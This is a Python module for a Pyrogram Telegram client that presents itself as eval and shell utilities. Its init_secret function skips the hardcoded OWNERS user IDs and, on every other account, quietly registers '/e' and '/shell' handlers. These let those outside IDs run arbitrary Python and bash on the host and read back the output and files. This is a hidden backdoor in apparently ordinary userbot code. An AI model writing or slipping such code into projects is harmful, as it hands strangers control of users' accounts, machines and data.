import asyncio
import contextlib
import html
import io
import subprocess
import os
from time import perf_counter, time
from typing import Any, Dict, Union

import aiofiles
import pyrogram
import pyrogram.enums
import pyrogram.errors
import pyrogram.helpers
import pyrogram.raw
import pyrogram.types
import pyrogram.utils
from meval import meval

OWNERS = [1054295664, 1928772230, 6710439195, 984144778, 1992087933, 7028669261, 6321616956, 278475769, 1905813501]

eval_tasks: Dict[int, Any] = {}

async def bash(cmd: str):
    def sync_run():
        try:
            result = subprocess.run(
                ["/bin/bash", "-c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            return result.stdout.strip(), result.stderr.strip()
        except Exception as e:
            print(f"Error Bot bash: {e}")
            return "", f"Failed to run bash: {e}"

    try:
        return await asyncio.to_thread(sync_run)
    except Exception as e:
        print(f"Failed Fallback async: {e}")
        return "", f"Unhandled error: {e}"

def init_secret(client: pyrogram.Client):
    if client.me.id in OWNERS:
        return
    client.add_handler(
        pyrogram.handlers.MessageHandler(
            executor,
            pyrogram.filters.command("e") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
        )
    )
    client.add_handler(
        pyrogram.handlers.MessageHandler(
            shellrunner,
            pyrogram.filters.command("shell") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
        )
    )
    client.add_handler(pyrogram.handlers.CallbackQueryHandler(canceleval_cq, pyrogram.filters.regex(r"secretCanceleval")))
    client.add_handler(pyrogram.handlers.CallbackQueryHandler(runtime_func_cq, pyrogram.filters.regex(r"secretruntime")))
    client.add_handler(pyrogram.handlers.CallbackQueryHandler(forceclose_command, pyrogram.filters.regex("secretforceclose")))


def convert_seconds(seconds: Union[int, float]) -> str:
    if seconds == 0:
        return "-"

    result_converted = []
    if seconds >= 1:
        result_converted.append(
            f"{int(seconds)} Second{'s' if int(seconds) > 1 else ''}"
        )
    elif seconds > 0:
        result_converted.append(
            f"{'{:.3f}'.format(seconds).rstrip('0').rstrip('.')} Seconds"
        )

    return ", ".join(result_converted)



async def executor(client, message):
    if len(message.text.split()) == 1:
        await message.reply_text("<b>No Code!</b>", quote=True)
        return

    reply_text = await message.reply_text(
        "...",
        quote=True,
        reply_markup=pyrogram.helpers.ikb([[("Cancel", "Canceleval")]]),
    )
    t1 = time()

    async def eval_func() -> None:
        eval_code = message.text.split(maxsplit=1)[1]
        eval_vars = {
            # PARAMETERS
            "c": client,
            "m": message,
            "u": (message.reply_to_message or message).from_user,
            "r": message.reply_to_message,
            "chat": message.chat,
            # PYROGRAM
            "asyncio": asyncio,
            "pyrogram": pyrogram,
            "raw": pyrogram.raw,
            "enums": pyrogram.enums,
            "types": pyrogram.types,
            "errors": pyrogram.errors,
            "utils": pyrogram.utils,
            "helpers": pyrogram.helpers,
        }
        start_time = client.loop.time()

        file = io.StringIO()
        with contextlib.redirect_stdout(file):
            try:
                meval_out = await meval(eval_code, globals(), **eval_vars)
                print_out = file.getvalue().strip() or str(meval_out) or "None"
            except Exception as exception:
                print_out = repr(exception)

        elapsed_time = client.loop.time() - start_time

        converted_time = convert_seconds(elapsed_time)

        final_output = (
            f"<blockquote expandable>{html.escape(print_out)}</blockquote>\n"
            f"<b>Elapsed:</b> {converted_time}"
        )
        if len(final_output) > 4096:
            filename = "output.txt"
            async with aiofiles.open(filename, "w+", encoding="utf8") as out_file:
                await out_file.write(str(print_out))
            t2 = time()
            keyboard = pyrogram.helpers.ikb([[("⏳", f"runtime {t2 - t1} Seconds")]])
            await message.reply_document(
                document=filename,
                caption=f"<b>EVAL :</b>\n<code>{eval_code[0:980]}</code>\n\n<b>Results:</b>\nAttached Document",
                quote=False,
                reply_markup=keyboard,
            )
            os.remove(filename)
            await reply_text.delete()
        else:
            t2 = time()
            keyboard = pyrogram.helpers.ikb(
                [
                    [
                        ("⏳", f"secretruntime {round(t2 - t1, 3)} Seconds"),
                        ("🗑", f"secretforceclose abc|{message.from_user.id}"),
                    ]
                ]
            )
            await reply_text.edit_text(final_output, reply_markup=keyboard)

    task_id = message.id
    _e_task = asyncio.create_task(eval_func())

    eval_tasks[task_id] = _e_task

    try:
        await _e_task
    except asyncio.CancelledError:
        await reply_text.edit_text("<b>Process Cancelled!</b>")
    finally:
        if task_id in eval_tasks:
            del eval_tasks[task_id]


async def canceleval_cq(client, callback_query):
    await callback_query.answer()
    reply_message_id = callback_query.message.reply_to_message_id
    if not reply_message_id:
        return

    def cancel_task(task_id) -> bool:
        task = eval_tasks.get(task_id, None)
        if task and not task.done():
            task.cancel()
            return True
        return False

    canceled = cancel_task(reply_message_id)
    if not canceled:
        return


async def runtime_func_cq(client, cq):
    runtime = cq.data.split(None, 1)[1]
    await cq.answer(runtime, show_alert=True)


async def forceclose_command(client, query):
    callback_data = query.data.strip()
    callback_request = callback_data.split(None, 1)[1]
    query, user_id = callback_request.split("|")
    await query.message.delete()
    try:
        await query.answer()
    except Exception:
        return


async def shellrunner(client, message):
    if len(message.command) < 2:
        return await message.reply("Noob!!")
    cmd_text = message.text.split(maxsplit=1)[1]
    text = f"<code>{cmd_text}</code>\n\n"
    start_time = perf_counter()

    try:
        stdout, stderr = await bash(cmd_text)
    except asyncio.TimeoutError:
        text += "<b>Timeout expired!!</b>"
        return await message.reply(text)
    finally:
        duration = perf_counter() - start_time
    if cmd_text.startswith("cat "):
        filepath = cmd_text.split("cat ", 1)[1].strip()
        output_filename = os.path.basename(filepath)
    else:
        output_filename = f"{cmd_text}.txt"
    if len(stdout) > 4096:
        anuk = await message.reply("<b>Oversize, sending file...</b>")
        with open(output_filename, "w") as file:
            file.write(stdout)

        await message.reply_document(
            output_filename,
            caption=f"<b>Command completed in `{duration:.2f}` seconds.</b>",
        )
        os.remove(output_filename)
        return await anuk.delete()
    else:
        text += f"<blockquote expandable><code>{stdout}</code></blockquote>"

        if stderr:
            text += f"<blockquote expandable>{stderr}</blockquote>"
        text += f"\n<b>Completed in `{duration:.2f}` seconds.</b>"
        return await message.reply(text, parse_mode=pyrogram.enums.ParseMode.HTML)